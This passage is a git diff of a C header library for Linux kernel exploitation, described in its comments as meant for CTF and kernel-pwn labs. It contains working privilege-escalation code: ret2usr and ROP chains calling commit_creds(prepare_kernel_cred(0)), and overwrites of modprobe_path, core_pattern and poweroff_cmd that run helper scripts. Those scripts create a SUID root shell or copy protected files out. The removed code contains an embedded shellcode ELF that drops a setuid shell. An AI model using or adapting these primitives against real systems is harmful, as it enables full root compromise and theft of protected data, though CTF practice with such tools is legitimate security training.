@@ -1,49 +1,75 @@
-// inspired by the goat: https://github.com/n132/libx/blob/main/libx.c
+// Inspired by: https://github.com/n132/libx/blob/main/libx.c
+// Intended for isolated kernel-pwn labs and CTF virtual machines.
 #define _GNU_SOURCE
 #ifndef LIBPWN_H
+#define LIBPWN_H
+
+#include <assert.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <limits.h>
+#include <netinet/tcp.h>
+#include <poll.h>
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stddef.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <sched.h>
-#include <sys/mman.h>
-#include <signal.h>
-#include <sys/syscall.h>
-#include <sys/ioctl.h>
-#include <sys/wait.h>
-#include <poll.h>
-#include <unistd.h>
-#include <pthread.h>
 #include <string.h>
+#include <sys/ioctl.h>
 #include <sys/ipc.h>
+#include <sys/mman.h>
 #include <sys/msg.h>
-#include <stdint.h>
-#include <errno.h>
-#include <stddef.h>
-#include <sys/socket.h>
-#include <sys/un.h>
-#include <assert.h>
-#include <sys/timerfd.h>
-#include <sys/resource.h>
-#include <sys/ptrace.h>
-#include <sys/user.h>
-#include <netinet/tcp.h>  // for SOL_TCP, TCP options
 #include <sys/prctl.h>
-#include <poll.h>
+#include <sys/ptrace.h>
+#include <sys/resource.h>
 #include <sys/shm.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/timerfd.h>
+#include <sys/types.h>
+#include <sys/un.h>
+#include <sys/user.h>
+#include <sys/wait.h>
+#include <unistd.h>
 
-size_t kernel_base = 0xffffffff81000000;
-#define KADDR(addr) ((size_t)(addr)-0xffffffff81000000 + kernel_base);
-int fd;
+#ifndef PATH_MAX
+#define PATH_MAX 4096
+#endif
 
-#define TTY_FILE                        "/dev/ptmx"  
-#define DEFAULT_MODPROBE_TRIGGER        "/tmp/fake"
-#define DEFAULT_EVIL_MODPROBE_PATH      "/tmp/pwn"
+#define KERNEL_TEXT_BASE 0xffffffff81000000UL
+size_t kernel_base = KERNEL_TEXT_BASE;
+#define KADDR(addr) ((size_t)(addr) - KERNEL_TEXT_BASE + kernel_base)
+
+int fd = -1;
+
+#define TTY_FILE                         "/dev/ptmx"
+#define DEFAULT_ROOT_SHELL               "/tmp/rootsh"
+
+#define DEFAULT_MODPROBE_TRIGGER          "/tmp/modprobe_trigger"
+#define DEFAULT_EVIL_MODPROBE_PATH        "/tmp/modprobe_helper"
+#define DEFAULT_MODPROBE_RESULT            "/tmp/modprobe_result"
+
+#define DEFAULT_CORE_PATTERN_HELPER       "/tmp/core_pattern_helper"
+#define DEFAULT_CORE_PATTERN_RESULT       "/tmp/core_pattern_result"
+#define CORE_PATTERN_PAYLOAD              "|" DEFAULT_CORE_PATTERN_HELPER
+#define CORE_PATTERN_PAYLOAD_LEN          sizeof(CORE_PATTERN_PAYLOAD)
+#define CORE_PATTERN_MAX                  128
+
+#define DEFAULT_POWEROFF_HELPER           "/tmp/poweroff_helper"
+#define DEFAULT_POWEROFF_RESULT           "/tmp/poweroff_result"
+#define POWEROFF_CMD_PAYLOAD              DEFAULT_POWEROFF_HELPER
+#define POWEROFF_CMD_PAYLOAD_LEN          sizeof(POWEROFF_CMD_PAYLOAD)
+#define POWEROFF_CMD_MAX                  256
 
 #define SUCCESS_MSG(msg) "\033[32m\033[1m" msg "\033[0m"
-#define INFO_MSG(msg) "\033[34m\033[1m" msg "\033[0m"
-#define ERROR_MSG(msg) "\033[31m\033[1m" msg "\033[0m"
+#define INFO_MSG(msg)    "\033[34m\033[1m" msg "\033[0m"
+#define ERROR_MSG(msg)   "\033[31m\033[1m" msg "\033[0m"
+
 #define log_success(fmt, ...) printf(SUCCESS_MSG(fmt "\n"), ##__VA_ARGS__)
 #define log_info(fmt, ...)    printf(INFO_MSG(fmt "\n"), ##__VA_ARGS__)
 #define log_error(fmt, ...)   printf(ERROR_MSG(fmt "\n"), ##__VA_ARGS__)
@@ -52,270 +78,558 @@ typedef unsigned long u64;
 typedef unsigned int u32;
 typedef unsigned short u16;
 typedef unsigned char u8;
+
+/*
+ * Challenge-specific adapters.
+ *
+ * kwrite_bytes must copy exactly len bytes into kernel virtual address dst.
+ * It can internally split the operation into qword/dword/byte writes.
+ *
+ * trigger_fn is useful for poweroff_cmd because reaching orderly_poweroff()
+ * depends on the vulnerable driver or the exploit's control-flow primitive.
+ */
+typedef void (*kwrite_bytes_fn)(size_t dst, const void *src, size_t len);
+typedef void (*trigger_fn)(void);
+
 size_t user_cs, user_ss, user_rflags, user_sp, user_rip;
 size_t leak;
 
-void error(const char *msg){
-    printf(ERROR_MSG("[!] %s\n"), msg);
-    exit(-1);
-}
+/* Common kernel symbol addresses. Set these after resolving KASLR. */
+size_t commit_creds = 0;
+size_t prepare_kernel_cred = 0;
+size_t modprobe_path = 0;
+size_t core_pattern = 0;
+size_t poweroff_cmd = 0;
+size_t orderly_poweroff = 0;
 
-void spawn_shell() {
-    log_info("Hello from user land!");
-    uid_t uid = getuid();
-    if (uid == 0) {
-        printf(SUCCESS_MSG("[+] UID: %d, got root!\n"), uid);
-        char *args[] = {"/bin/sh", NULL};
-        char *env[] = {NULL};
-        execve("/bin/sh", args, env); // Directly execute a shell
-        error("execve failed"); // If execve fails, print error
-    } else {
-        printf(ERROR_MSG("[!] UID: %d, we are root-less :(!\n"), uid);
-        exit(-1);
-    }
-}
-
-void save_state() {
-    __asm__(".intel_syntax noprefix;"
-            "mov user_cs, cs;"
-            "mov user_ss, ss;"
-            "mov user_sp, rsp;"
-            "pushf;"
-            "pop user_rflags;"
-            ".att_syntax");
-    user_rip = (size_t)spawn_shell;
-    log_success("[+] Saved state");
-}
-
-
-// ret2usr
-size_t commit_creds = 0, prepare_kernel_cred = 0;
-
-void* (*prepare_kernel_cred_kfunc)(void *task_struct);
-int (*commit_creds_kfunc)(void *cred);
-
-
-void ret2usr_attack(void)
+static void error(const char *msg)
 {
-    prepare_kernel_cred_kfunc = (void*(*)(void*)) prepare_kernel_cred;
-    commit_creds_kfunc = (int (*)(void*)) commit_creds;
+    fprintf(stderr, ERROR_MSG("[!] %s: %s\n"), msg, strerror(errno));
+    exit(EXIT_FAILURE);
+}
 
-    (*commit_creds_kfunc)((*prepare_kernel_cred_kfunc)(NULL));
+static void die_msg(const char *msg)
+{
+    fprintf(stderr, ERROR_MSG("[!] %s\n"), msg);
+    exit(EXIT_FAILURE);
+}
+
+static void write_file_exact(const char *path, const void *buf, size_t len,
+                             mode_t mode)
+{
+    int out = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
+    if (out < 0)
+        error("open output file");
+
+    const unsigned char *p = buf;
+    size_t remaining = len;
+
+    while (remaining > 0) {
+        ssize_t n = write(out, p, remaining);
+        if (n < 0 && errno == EINTR)
+            continue;
+        if (n <= 0) {
+            close(out);
+            error("write output file");
+        }
+        p += (size_t)n;
+        remaining -= (size_t)n;
+    }
+
+    if (fchmod(out, mode) < 0) {
+        close(out);
+        error("fchmod output file");
+    }
+
+    if (close(out) < 0)
+        error("close output file");
+}
+
+static void write_script(const char *path, const char *body)
+{
+    write_file_exact(path, body, strlen(body), 0755);
+    log_success("[+] Wrote helper script -> %s", path);
+}
+
+static bool wait_for_suid_root_file(const char *path, unsigned attempts,
+                                    useconds_t delay_us)
+{
+    struct stat st;
+
+    for (unsigned i = 0; i < attempts; i++) {
+        if (stat(path, &st) == 0 && st.st_uid == 0 &&
+            (st.st_mode & S_ISUID) && (st.st_mode & S_IXUSR))
+            return true;
+        usleep(delay_us);
+    }
+
+    return false;
+}
+
+static bool wait_for_readable_file(const char *path, unsigned attempts,
+                                   useconds_t delay_us)
+{
+    for (unsigned i = 0; i < attempts; i++) {
+        if (access(path, R_OK) == 0)
+            return true;
+        usleep(delay_us);
+    }
+
+    return false;
+}
+
+static void spawn_suid_shell(const char *path)
+{
+    char *const argv[] = {(char *)"sh", (char *)"-p", NULL};
+    char *const envp[] = {NULL};
+
+    log_info("[*] Executing %s -p", path);
+    execve(path, argv, envp);
+    error("execve SUID shell");
+}
+
+static void spawn_shell(void)
+{
+    uid_t ruid = getuid();
+    uid_t euid = geteuid();
+
+    log_info("[*] Returned to userland: ruid=%u euid=%u",
+             (unsigned)ruid, (unsigned)euid);
+
+    if (euid != 0)
+        die_msg("Returned to userland without effective UID 0");
+
+    char *const argv[] = {(char *)"sh", (char *)"-p", NULL};
+    char *const envp[] = {NULL};
+    execve("/bin/sh", argv, envp);
+    error("execve /bin/sh");
+}
+
+static void save_state(void)
+{
+    asm volatile(
+        "mov %%cs, %0\n\t"
+        "mov %%ss, %1\n\t"
+        "mov %%rsp, %2\n\t"
+        "pushfq\n\t"
+        "pop %3\n\t"
+        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp),
+          "=r"(user_rflags)
+        :
+        : "memory"
+    );
+
+    user_rip = (size_t)spawn_shell;
+    log_success("[+] Saved userland state");
+}
+
+/* -------------------------- ret2usr -------------------------- */
+
+static void *(*prepare_kernel_cred_kfunc)(void *task_struct);
+static int (*commit_creds_kfunc)(void *cred);
+
+__attribute__((noreturn))
+static void ret2usr_attack(void)
+{
+    if (!prepare_kernel_cred || !commit_creds)
+        die_msg("Set prepare_kernel_cred and commit_creds first");
+
+    prepare_kernel_cred_kfunc =
+        (void *(*)(void *))prepare_kernel_cred;
+    commit_creds_kfunc =
+        (int (*)(void *))commit_creds;
+
+    commit_creds_kfunc(prepare_kernel_cred_kfunc(NULL));
 
     asm volatile(
-        "mov %%rax, %[ss]\n\t"
-        "push %%rax\n\t"
-        "mov %%rax, %[sp]\n\t"
-        "sub %%rax, 8\n\t"
-        "push %%rax\n\t"
-        "mov %%rax, %[rflags]\n\t"
-        "push %%rax\n\t"
-        "mov %%rax, %[cs]\n\t"
-        "push %%rax\n\t"
-        "mov %%rax, %[rip]\n\t"
-        "push %%rax\n\t"
+        "pushq %[ss]\n\t"
+        "pushq %[sp]\n\t"
+        "pushq %[rflags]\n\t"
+        "pushq %[cs]\n\t"
+        "pushq %[rip]\n\t"
         "swapgs\n\t"
         "iretq\n\t"
         :
-        : [ss]"r"(user_ss),
-        [sp]"r"(user_sp),
-        [rflags]"r"(user_rflags),
-        [cs]"r"(user_cs),
-        [rip]"r"(spawn_shell)
-        : "rax"
+        : [ss] "r"(user_ss),
+          [sp] "r"(user_sp),
+          [rflags] "r"(user_rflags),
+          [cs] "r"(user_cs),
+          [rip] "r"((size_t)spawn_shell)
+        : "memory"
     );
+
+    __builtin_unreachable();
 }
 
-size_t *rop_commit(int i) {
-    size_t pop_rdi = KADDR(0xffffffff8104b80d);
-    size_t pop_rsi = KADDR(0xffffffff8104b80d);
-    size_t pop_rcx = KADDR(0xffffffff8104b80d);
-    size_t mov_rdi_rax = KADDR(0xffffffff8104b80d);
+/* -------------------------- kernel ROP -------------------------- */
 
-    size_t prepare_kernel_cred = KADDR(0xffffffff810b9c20);
-    size_t commit_creds = KADDR(0xffffffff810b9970);
-    size_t init_cred = KADDR(0xffffffff82a52fc0);
-    size_t swapgs_restore_regs_and_return_to_usermode = KADDR(0xffffffff8200180c);
+static size_t *rop_commit(size_t i)
+{
+    /* Replace every placeholder with gadgets from the target vmlinux. */
+    size_t pop_rdi = KADDR(0xffffffff8104b80dUL);
+    size_t pop_rsi = KADDR(0xffffffff8104b80dUL);
+    size_t pop_rcx = KADDR(0xffffffff8104b80dUL);
+    size_t mov_rdi_rax = KADDR(0xffffffff8104b80dUL);
 
-    static size_t fuzz[100] = {0};
+    size_t prepare_cred = KADDR(0xffffffff810b9c20UL);
+    size_t commit = KADDR(0xffffffff810b9970UL);
+    size_t swapgs_restore_regs_and_return_to_usermode =
+        KADDR(0xffffffff8200180cUL);
 
-    fuzz[i++] = pop_rdi;
-    fuzz[i++] = 0;
-    fuzz[i++] = prepare_kernel_cred;
-    fuzz[i++] = pop_rcx;
-    fuzz[i++] = 1;
-    fuzz[i++] = pop_rsi;
-    fuzz[i++] = 20;
-    fuzz[i++] = mov_rdi_rax;
-    fuzz[i++] = commit_creds;
-    fuzz[i++] = swapgs_restore_regs_and_return_to_usermode + 22;
-    fuzz[i++] = 0;
-    fuzz[i++] = 0;
-    fuzz[i++] = (size_t)spawn_shell;
-    fuzz[i++] = user_cs;
-    fuzz[i++] = user_rflags;
-    fuzz[i++] = user_sp;
-    fuzz[i++] = user_ss;
-    return fuzz;
+    static size_t chain[100];
+    memset(chain, 0, sizeof(chain));
+
+    if (i + 17 >= sizeof(chain) / sizeof(chain[0]))
+        die_msg("ROP chain start index is too large");
+
+    chain[i++] = pop_rdi;
+    chain[i++] = 0;
+    chain[i++] = prepare_cred;
+    chain[i++] = pop_rcx;
+    chain[i++] = 1;
+    chain[i++] = pop_rsi;
+    chain[i++] = 20;
+    chain[i++] = mov_rdi_rax;
+    chain[i++] = commit;
+    chain[i++] = swapgs_restore_regs_and_return_to_usermode + 22;
+    chain[i++] = 0;
+    chain[i++] = 0;
+    chain[i++] = (size_t)spawn_shell;
+    chain[i++] = user_cs;
+    chain[i++] = user_rflags;
+    chain[i++] = user_sp;
+    chain[i++] = user_ss;
+
+    return chain;
 }
 
-// modprobe_path attack
-size_t modprobe_path;
+/* -------------------------- shared UMH payloads -------------------------- */
 
-void modprobe_setup(unsigned char *payload, size_t payload_len) {
-    struct stat st = {0};
-    log_info("Hello from user land!");
-    if (stat("/tmp", &st) == -1) {
-        log_info("[*] Creating /tmp");
-        int ret = mkdir("/tmp", S_IRWXU);
-        if (ret == -1) error("Failed to create /tmp");
-    }
+static void prepare_suid_shell_helper(const char *helper_path)
+{
+    char script[1024];
 
-    FILE *fptr = fopen(DEFAULT_EVIL_MODPROBE_PATH, "w");
-    if (fwrite(payload, payload_len, 1, fptr) != 1) error("Failed to write ELF payload");
-    fclose(fptr);
+    int n = snprintf(script, sizeof(script),
+        "#!/bin/sh\n"
+        "cp /bin/sh " DEFAULT_ROOT_SHELL "\n"
+        "chown 0:0 " DEFAULT_ROOT_SHELL "\n"
+        "chmod 4755 " DEFAULT_ROOT_SHELL "\n");
 
-    printf(SUCCESS_MSG("[+] Wrote win condition -> %s\n"), DEFAULT_EVIL_MODPROBE_PATH);
+    if (n < 0 || (size_t)n >= sizeof(script))
+        die_msg("SUID helper script was truncated");
 
-    fptr = fopen(DEFAULT_MODPROBE_TRIGGER, "w");
-    if (!fptr) error("Failed to open dummy file");
-    log_info("Writing dummy file...");
-    if (fputs("\xff\xff\xff\xff", fptr) == EOF) error("Failed to write dummy file");
-    fclose(fptr);
-    
-    printf(SUCCESS_MSG("[+] Wrote modprobe trigger -> %s\n"), DEFAULT_MODPROBE_TRIGGER);
-
-    if (chmod(DEFAULT_EVIL_MODPROBE_PATH, 0777) < 0) error("Failed to chmod win condition");
-    if (chmod(DEFAULT_MODPROBE_TRIGGER, 0777) < 0) error("Failed to chmod win condition");
-
-    printf(INFO_MSG("[*] Triggering modprobe by executing %s\n"), DEFAULT_MODPROBE_TRIGGER);
-    execv(DEFAULT_MODPROBE_TRIGGER, NULL);
-
+    unlink(DEFAULT_ROOT_SHELL);
+    write_script(helper_path, script);
 }
 
-void modprobe_attack_root(){
-    // small ELF file matroshka doll that does;
-    //   fd = open("/sh", O_WRONLY | O_CREAT | O_TRUNC);
-    //   write(fd, elfcode, elfcode_len)
-    //   chmod("/sh", 04755)
-    //   close(fd);
-    //   exit(0);
-    //
-    // the dropped ELF simply does:
-    //   setuid(0);
-    //   setgid(0);
-    //   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
-    unsigned char elfcode[] = {
-    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
-    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
-    0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
-    0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
-    0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
-    0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
-    0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
-    0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
-    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2e, 0x2f, 0x2f,
-    0x2f, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
-    0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
-    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
-    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
-    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
-    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
-    0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
-    0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
-    0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
-    };
-    log_info("[*] Setting up to get root");
+/* Only pass trusted, fixed CTF paths to source_path. */
+static void prepare_file_copy_helper(const char *helper_path,
+                                     const char *source_path,
+                                     const char *result_path)
+{
+    char script[PATH_MAX * 2 + 256];
 
-    modprobe_setup(elfcode, sizeof(elfcode));
+    if (strchr(source_path, '\'') || strchr(result_path, '\''))
+        die_msg("Single quotes are not supported in helper paths");
 
-    log_info("[?] Hopefully GG");
-    system("/sh");
+    int n = snprintf(script, sizeof(script),
+        "#!/bin/sh\n"
+        "cp -- '%s' '%s'\n"
+        "chown 0:0 '%s'\n"
+        "chmod 0644 '%s'\n",
+        source_path, result_path, result_path, result_path);
+
+    if (n < 0 || (size_t)n >= sizeof(script))
+        die_msg("File-copy helper script was truncated");
+
+    unlink(result_path);
+    write_script(helper_path, script);
 }
 
-void modprobe_attack_read(char *filename){
-    char arb_exec[256];
-
-    snprintf(arb_exec, sizeof(arb_exec),
-             "#!/bin/sh\n"
-             "chmod 777 %s", filename);
-    printf(INFO_MSG("[*] Setting up reading '%s:' as non-root user...\n"), filename);
-
-    modprobe_setup((unsigned char *)arb_exec, strlen(arb_exec));
-
-    log_info("[?] Hopefully GG");
-    FILE *fptr = fopen(filename, "r");
-    if (!fptr) error("Failed to open results file");
+static void print_file(const char *path)
+{
+    FILE *f = fopen(path, "r");
+    if (!f)
+        error("fopen result file");
 
     char *line = NULL;
-    size_t len = 0;
-    for (int i = 0; i < 8; i++) {
-        uint64_t read = getline(&line, &len, fptr);
-        printf("%s", line);
-    }
+    size_t cap = 0;
+    ssize_t n;
 
-    fclose(fptr);
+    while ((n = getline(&line, &cap, f)) >= 0)
+        fwrite(line, 1, (size_t)n, stdout);
 
+    free(line);
+    fclose(f);
 }
 
+/* -------------------------- modprobe_path -------------------------- */
 
-//for race condtion
-void bind_cpu(int core)
+static void trigger_modprobe(void)
 {
-    cpu_set_t cpu_set;
-    CPU_ZERO(&cpu_set);
-    CPU_SET(core, &cpu_set);
-    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
+    static const unsigned char unknown_binary[] = {0xff, 0xff, 0xff, 0xff};
+
+    write_file_exact(DEFAULT_MODPROBE_TRIGGER, unknown_binary,
+                     sizeof(unknown_binary), 0755);
+
+    char *const argv[] = {(char *)DEFAULT_MODPROBE_TRIGGER, NULL};
+    char *const envp[] = {NULL};
+
+    log_info("[*] Triggering request_module via %s",
+             DEFAULT_MODPROBE_TRIGGER);
+    execve(DEFAULT_MODPROBE_TRIGGER, argv, envp);
+
+    /* ENOEXEC is expected in the original process; the kernel-side helper
+       may already have run. A forked trigger is used by the wrappers below. */
 }
 
-//msg_msg
-int make_queue(key_t key, int msgflg){
-    int result;
-    if ((result = msgget(key, msgflg)) == -1) error("msgget failure");
-    else return result;
-}
+static void trigger_modprobe_child(void)
+{
+    pid_t pid = fork();
+    if (pid < 0)
+        error("fork modprobe trigger");
 
-void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg){
-    if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0) error("msgrcv");
-}
+    if (pid == 0) {
+        trigger_modprobe();
+        _exit(EXIT_FAILURE);
+    }
 
-void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg){
-    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1) error("msgsend failure");
-}
-
-
-void dump_hex(char *buf, size_t size){
-    for(int i = 0; i < size/8; i++){
-        printf(SUCCESS_MSG("[+] %d - 0x%016lx\n"), i, ((unsigned long *)buf)[i]);
+    int status;
+    while (waitpid(pid, &status, 0) < 0) {
+        if (errno != EINTR)
+            error("waitpid modprobe trigger");
     }
 }
 
+static void modprobe_attack_root(kwrite_bytes_fn kwrite)
+{
+    if (!kwrite)
+        die_msg("modprobe_attack_root requires kwrite_bytes");
+    if (!modprobe_path)
+        die_msg("Set modprobe_path first");
 
-void ppause(){
-    log_info("enter to unpause");
-    getchar();
+    prepare_suid_shell_helper(DEFAULT_EVIL_MODPROBE_PATH);
+    kwrite(modprobe_path, DEFAULT_EVIL_MODPROBE_PATH,
+           sizeof(DEFAULT_EVIL_MODPROBE_PATH));
+
+    trigger_modprobe_child();
+
+    if (!wait_for_suid_root_file(DEFAULT_ROOT_SHELL, 200, 10000))
+        die_msg("modprobe helper did not create the SUID shell");
+
+    spawn_suid_shell(DEFAULT_ROOT_SHELL);
 }
 
-void info(const char *msg, unsigned long val){
-    printf(INFO_MSG("[*] %s: %p\n"), msg, val);
+static void modprobe_attack_read(kwrite_bytes_fn kwrite,
+                                 const char *filename)
+{
+    if (!kwrite)
+        die_msg("modprobe_attack_read requires kwrite_bytes");
+    if (!modprobe_path)
+        die_msg("Set modprobe_path first");
+
+    prepare_file_copy_helper(DEFAULT_EVIL_MODPROBE_PATH, filename,
+                             DEFAULT_MODPROBE_RESULT);
+    kwrite(modprobe_path, DEFAULT_EVIL_MODPROBE_PATH,
+           sizeof(DEFAULT_EVIL_MODPROBE_PATH));
+
+    trigger_modprobe_child();
+
+    if (!wait_for_readable_file(DEFAULT_MODPROBE_RESULT, 200, 10000))
+        die_msg("modprobe helper did not create a readable result");
+
+    print_file(DEFAULT_MODPROBE_RESULT);
 }
 
+/* -------------------------- core_pattern -------------------------- */
 
+static void trigger_core_pattern(void)
+{
+    pid_t pid = fork();
+    if (pid < 0)
+        error("fork core_pattern trigger");
+
+    if (pid == 0) {
+        struct rlimit core_limit = {
+            .rlim_cur = RLIM_INFINITY,
+            .rlim_max = RLIM_INFINITY,
+        };
+
+        /* A piped core handler ignores RLIMIT_CORE, but setting it makes the
+           trigger work consistently on older/minimal challenge images too. */
+        (void)setrlimit(RLIMIT_CORE, &core_limit);
+        (void)prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
+        signal(SIGSEGV, SIG_DFL);
+        raise(SIGSEGV);
+        _exit(EXIT_FAILURE);
+    }
+
+    int status;
+    while (waitpid(pid, &status, 0) < 0) {
+        if (errno != EINTR)
+            error("waitpid core_pattern trigger");
+    }
+}
+
+static void core_pattern_attack_root(kwrite_bytes_fn kwrite)
+{
+    if (!kwrite)
+        die_msg("core_pattern_attack_root requires kwrite_bytes");
+    if (!core_pattern)
+        die_msg("Set core_pattern first");
+    if (CORE_PATTERN_PAYLOAD_LEN > CORE_PATTERN_MAX)
+        die_msg("core_pattern payload is too long");
+
+    prepare_suid_shell_helper(DEFAULT_CORE_PATTERN_HELPER);
+    kwrite(core_pattern, CORE_PATTERN_PAYLOAD, CORE_PATTERN_PAYLOAD_LEN);
+
+    log_success("[+] core_pattern <- %s", CORE_PATTERN_PAYLOAD);
+    trigger_core_pattern();
+
+    if (!wait_for_suid_root_file(DEFAULT_ROOT_SHELL, 200, 10000))
+        die_msg("core_pattern helper did not create the SUID shell");
+
+    spawn_suid_shell(DEFAULT_ROOT_SHELL);
+}
+
+static void core_pattern_attack_read(kwrite_bytes_fn kwrite,
+                                     const char *filename)
+{
+    if (!kwrite)
+        die_msg("core_pattern_attack_read requires kwrite_bytes");
+    if (!core_pattern)
+        die_msg("Set core_pattern first");
+    if (CORE_PATTERN_PAYLOAD_LEN > CORE_PATTERN_MAX)
+        die_msg("core_pattern payload is too long");
+
+    prepare_file_copy_helper(DEFAULT_CORE_PATTERN_HELPER, filename,
+                             DEFAULT_CORE_PATTERN_RESULT);
+    kwrite(core_pattern, CORE_PATTERN_PAYLOAD, CORE_PATTERN_PAYLOAD_LEN);
+
+    log_success("[+] core_pattern <- %s", CORE_PATTERN_PAYLOAD);
+    trigger_core_pattern();
+
+    if (!wait_for_readable_file(DEFAULT_CORE_PATTERN_RESULT, 200, 10000))
+        die_msg("core_pattern helper did not create a readable result");
+
+    print_file(DEFAULT_CORE_PATTERN_RESULT);
+}
+
+/* -------------------------- poweroff_cmd -------------------------- */
+
+/*
+ * poweroff_cmd is consumed by orderly_poweroff(), not by the reboot(2)
+ * power-off path and not generically by /proc/sysrq-trigger.
+ *
+ * Therefore trigger_orderly_poweroff must be supplied by the challenge:
+ * for example, an ioctl path that calls orderly_poweroff(), a function-call
+ * primitive, or a short ROP chain that invokes orderly_poweroff(false).
+ */
+static void poweroff_cmd_attack_root(kwrite_bytes_fn kwrite,
+                                     trigger_fn trigger_orderly_poweroff)
+{
+    if (!kwrite)
+        die_msg("poweroff_cmd_attack_root requires kwrite_bytes");
+    if (!trigger_orderly_poweroff)
+        die_msg("Provide an exploit-specific orderly_poweroff trigger");
+    if (!poweroff_cmd)
+        die_msg("Set poweroff_cmd first");
+    if (POWEROFF_CMD_PAYLOAD_LEN > POWEROFF_CMD_MAX)
+        die_msg("poweroff_cmd payload is too long");
+
+    prepare_suid_shell_helper(DEFAULT_POWEROFF_HELPER);
+    kwrite(poweroff_cmd, POWEROFF_CMD_PAYLOAD, POWEROFF_CMD_PAYLOAD_LEN);
+
+    log_success("[+] poweroff_cmd <- %s", POWEROFF_CMD_PAYLOAD);
+    trigger_orderly_poweroff();
+
+    if (!wait_for_suid_root_file(DEFAULT_ROOT_SHELL, 300, 10000))
+        die_msg("poweroff helper did not create the SUID shell");
+
+    spawn_suid_shell(DEFAULT_ROOT_SHELL);
+}
+
+static void poweroff_cmd_attack_read(kwrite_bytes_fn kwrite,
+                                     trigger_fn trigger_orderly_poweroff,
+                                     const char *filename)
+{
+    if (!kwrite)
+        die_msg("poweroff_cmd_attack_read requires kwrite_bytes");
+    if (!trigger_orderly_poweroff)
+        die_msg("Provide an exploit-specific orderly_poweroff trigger");
+    if (!poweroff_cmd)
+        die_msg("Set poweroff_cmd first");
+    if (POWEROFF_CMD_PAYLOAD_LEN > POWEROFF_CMD_MAX)
+        die_msg("poweroff_cmd payload is too long");
+
